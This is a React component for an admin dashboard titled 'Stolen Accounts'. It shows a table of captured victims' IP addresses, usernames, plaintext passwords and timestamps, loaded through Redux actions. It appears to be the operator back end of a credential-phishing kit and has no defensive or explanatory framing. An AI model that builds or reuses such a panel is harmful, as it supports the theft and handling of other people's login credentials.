import React, { Component, Fragment } from 'react';
import PropTypes from 'prop-types';

import Navbar from '../layout/Navbar';

import Card from '@material-ui/core/Card';
import CardHeader from '@material-ui/core/CardHeader';
import CardContent from '@material-ui/core/CardContent';
import Typography from '@material-ui/core/Typography';
import CircularProgress from '@material-ui/core/CircularProgress';
import MaterialTable from 'material-table';

import { connect } from 'react-redux';
import { deleteAccount, getAccounts } from '../redux/actions/accountActions';
import { logoutAdmin } from '../redux/actions/authActions';

const columns = [
	{ title: 'IP', field: 'ip' },
	{ title: 'Username', field: 'username' },
	{ title: 'Password', field: 'password' },
	{ title: 'Time', field: 'time' }
];

class AdminDash extends Component {
	logout = () => {
		this.props.logoutAdmin(this.props.history);
	};

	componentDidMount() {
		this.props.getAccounts();
	}

	render() {
		const {
			accounts: { accounts, loading }
		} = this.props;

		return (
			<Fragment>
				<Navbar logout={this.logout} />
				<Card>
					<CardHeader
						title='Stolen Accounts'
						disableTypography
						component={Typography}
						variant='h5'
					/>
					{loading ? (
						<CircularProgress
							size={50}
							style={{ marginTop: 25 }}
							color='primary'
						/>
					) : (
						console.log(accounts.accounts)
					)}
					<CardContent>
						<MaterialTable
							title='Accounts'
							columns={columns}
                            data={accounts.accounts}
                            options={{ search: false, sorting: true }}
                            editable={{
                                onRowDelete: (oldData) => {
                                    new Promise((resolve, reject) => {
                                        resolve();
                                        console.log(oldData);
                                    });
                                }
                            }}
						></MaterialTable>
					</CardContent>
				</Card>
			</Fragment>
		);
	}
}

AdminDash.propTypes = {
	accounts: PropTypes.object.isRequired,
	UI: PropTypes.object.isRequired,
	getAccounts: PropTypes.func.isRequired,
	deleteAccount: PropTypes.func.isRequired,
	logoutAdmin: PropTypes.func.isRequired
};

const mapStateToProps = (state) => ({
	accounts: state.accounts,
	UI: state.UI
});

const mapActionsToProps = {
	getAccounts,
	deleteAccount,
	logoutAdmin
};

export default connect(mapStateToProps, mapActionsToProps)(AdminDash);
